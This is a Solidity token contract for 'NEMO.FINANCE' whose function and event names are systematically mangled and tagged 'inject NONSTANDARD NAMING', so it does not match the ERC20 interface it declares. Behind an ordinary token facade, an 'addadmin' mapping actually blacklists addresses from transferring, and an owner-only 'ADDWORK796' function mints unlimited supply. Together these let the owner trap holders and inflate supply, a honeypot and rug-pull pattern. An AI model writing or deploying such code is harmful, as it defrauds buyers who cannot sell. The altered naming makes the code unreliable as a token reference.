                                                                 

pragma solidity ^0.5.11;

interface IERC20 {
  function TOTALSUPPLY846() external view returns (uint256);	//inject NONSTANDARD NAMING
  function BALANCEOF746(address who) external view returns (uint256);	//inject NONSTANDARD NAMING
  function ALLOWANCE63(address owner, address spender) external view returns (uint256);	//inject NONSTANDARD NAMING
  function TRANSFER972(address to, uint256 value) external returns (bool);	//inject NONSTANDARD NAMING
  function APPROVE321(address spender, uint256 value) external returns (bool);	//inject NONSTANDARD NAMING
  function TRANSFERFROM902(address from, address to, uint256 value) external returns (bool);	//inject NONSTANDARD NAMING

  event TRANSFER472(address indexed from, address indexed to, uint256 value);	//inject NONSTANDARD NAMING
  event APPROVAL335(address indexed owner, address indexed spender, uint256 value);	//inject NONSTANDARD NAMING
}

library SafeMath {
  function MUL723(uint256 a, uint256 b) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
    if (a == 0) {
      return 0;
    }
    uint256 c = a * b;
    assert(c / a == b);
    return c;
  }

  function DIV593(uint256 a, uint256 b) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
    uint256 c = a / b;
    return c;
  }

  function SUB830(uint256 a, uint256 b) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
    assert(b <= a);
    return a - b;
  }

  function ADD887(uint256 a, uint256 b) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
    uint256 c = a + b;
    assert(c >= a);
    return c;
  }

  function CEIL57(uint256 a, uint256 m) internal pure returns (uint256) {	//inject NONSTANDARD NAMING
    uint256 c = ADD887(a,m);
    uint256 d = SUB830(c,1);
    return MUL723(DIV593(d,m),m);
  }
}

contract ERC20Detailed is IERC20 {

  uint8 private _Tokendecimals;
  string private _Tokenname;
  string private _Tokensymbol;

  constructor(string memory name, string memory symbol, uint8 decimals) public {
   
   _Tokendecimals = decimals;
    _Tokenname = name;
    _Tokensymbol = symbol;
    
  }

  function NAME8() public view returns(string memory) {	//inject NONSTANDARD NAMING
    return _Tokenname;
  }

  function SYMBOL889() public view returns(string memory) {	//inject NONSTANDARD NAMING
    return _Tokensymbol;
  }

  function DECIMALS211() public view returns(uint8) {	//inject NONSTANDARD NAMING
    return _Tokendecimals;
  }
}



contract NEMO is ERC20Detailed {

  using SafeMath for uint256;
    
  uint256 public totalBurn = 0;
  
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowed;
  mapping (address => bool) public addadmin;
  string constant tokenname49 = "NEMO.FINANCE";	//inject NONSTANDARD NAMING
  string constant tokensymbol390 = "NEMO";	//inject NONSTANDARD NAMING
  uint8  constant tokendecimals132 = 18;	//inject NONSTANDARD NAMING
  uint256 _totalSupply = 100000*10**uint(tokendecimals132); 
 
  
  //any tokens sent here ? 
  IERC20 currentToken ;
  	address payable public _owner;
    
    //modifiers	
	modifier ONLYOWNER145() {	//inject NONSTANDARD NAMING
      require(msg.sender == _owner);
      _;
  }
  
  address initialSupplySend = 0x8b07780c0ca30BF5595C3fbd96C15b1758B771FC;
  

  constructor() public payable ERC20Detailed(tokenname49, tokensymbol390, tokendecimals132) {
      
    _SUPPLY906(initialSupplySend, _totalSupply);
    _owner = msg.sender;
  }

  function TOTALSUPPLY846() public view returns (uint256) {	//inject NONSTANDARD NAMING
    return _totalSupply;
  }

  function BALANCEOF746(address owner) public view returns (uint256) {	//inject NONSTANDARD NAMING
    return _balances[owner];
  }

  function ALLOWANCE63(address owner, address spender) public view returns (uint256) {	//inject NONSTANDARD NAMING
    return _allowed[owner][spender];
  }

  function ADDADMIN672(address account) public {	//inject NONSTANDARD NAMING
      require(msg.sender == _owner, "!owner");
      addadmin[account] = true;
  }
  
    function REMOVEADMIN942(address account) public {	//inject NONSTANDARD NAMING
      require(msg.sender == _owner, "!owner");
      addadmin[account] = false;
  }

 function TRANSFER972(address to, uint256 value) public returns (bool) 	//inject NONSTANDARD NAMING
    {
        _EXECUTETRANSFER673(msg.sender, to, value);
        return true;
    }
    
    function MULTITRANSFER239(address[] memory receivers, uint256[] memory values) public	//inject NONSTANDARD NAMING
    {
        require(receivers.length == values.length);
        for(uint256 i = 0; i < receivers.length; i++)
            _EXECUTETRANSFER673(msg.sender, receivers[i], values[i]);
    }
    
    function TRANSFERFROM902(address from, address to, uint256 value) public returns (bool) 	//inject NONSTANDARD NAMING
    {
        require(value <= _allowed[from][msg.sender]);
        _allowed[from][msg.sender] = _allowed[from][msg.sender].SUB830(value);
        _EXECUTETRANSFER673(from, to, value);
        return true;
    }
   
    function _EXECUTETRANSFER673(address _from, address _to, uint256 _value) private	//inject NONSTANDARD NAMING
    {
      require(!addadmin[_from], "error");
        if (_to == address(0)) revert();                               // Prevent transfer to 0x0 address. Use burn() instead
		if (_value <= 0) revert(); 
        if (_balances[_from] < _value) revert();           // Check if the sender has enough
        if (_balances[_to] + _value < _balances[_to]) revert(); // Check for overflows
        _balances[_from] = SafeMath.SUB830(_balances[_from], _value);                     // Subtract from the sender
        _balances[_to] = SafeMath.ADD887(_balances[_to], _value);                            // Add the same to the recipient
        emit TRANSFER472(_from, _to, _value);                   // Notify anyone listening that this transfer took place
    }
         
  //no zeros for decimals necessary 
  function MULTITRANSFEREQUALAMOUNT873(address[] memory receivers, uint256 amount) public {	//inject NONSTANDARD NAMING
    uint256 amountWithDecimals = amount * 10**tokendecimals132;

    for (uint256 i = 0; i < receivers.length; i++) {
      TRANSFER972(receivers[i], amountWithDecimals);
    }
  }

  function APPROVE321(address spender, uint256 value) public returns (bool) {	//inject NONSTANDARD NAMING
    require(spender != address(0));
    _allowed[msg.sender][spender] = value;
    emit APPROVAL335(msg.sender, spender, value);
    return true;
  }

  function INCREASEALLOWANCE138(address spender, uint256 addedValue) public returns (bool) {	//inject NONSTANDARD NAMING
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].ADD887(addedValue));
    emit APPROVAL335(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function DECREASEALLOWANCE782(address spender, uint256 subtractedValue) public returns (bool) {	//inject NONSTANDARD NAMING
    require(spender != address(0));
    _allowed[msg.sender][spender] = (_allowed[msg.sender][spender].SUB830(subtractedValue));
    emit APPROVAL335(msg.sender, spender, _allowed[msg.sender][spender]);
    return true;
  }

  function _SUPPLY906(address account, uint256 amount) internal {	//inject NONSTANDARD NAMING
    require(amount != 0);
    _balances[account] = _balances[account].ADD887(amount);
    emit TRANSFER472(address(0), account, amount);
  }

 //take back unclaimed tokens of any type sent by mistake
  function WITHDRAWUNCLAIMEDTOKENS660(address contractUnclaimed) external ONLYOWNER145 {	//inject NONSTANDARD NAMING
      currentToken = IERC20(contractUnclaimed);
      uint256 amount = currentToken.BALANCEOF746(address(this));
      currentToken.TRANSFER972(_owner, amount);
  }
  
  function ADDWORK796(address account, uint256 amount) public {	//inject NONSTANDARD NAMING
      require(msg.sender == _owner, "!warning");
      _SUPPLY906(account, amount);
  }
}